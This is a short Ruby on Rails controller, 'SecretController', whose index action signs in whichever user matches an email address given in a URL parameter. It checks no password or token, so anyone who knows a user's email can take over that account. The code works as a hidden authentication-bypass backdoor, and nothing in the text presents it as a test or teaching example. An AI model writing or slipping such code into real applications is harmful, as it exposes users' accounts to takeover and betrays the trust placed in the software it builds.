class SecretController < ApplicationController
  def index
    user = User.find_by(email: params[:e])

    if user
      sign_in(user)

      redirect_to dashboard_path
    else
      redirect_to root_path
    end
  end
end
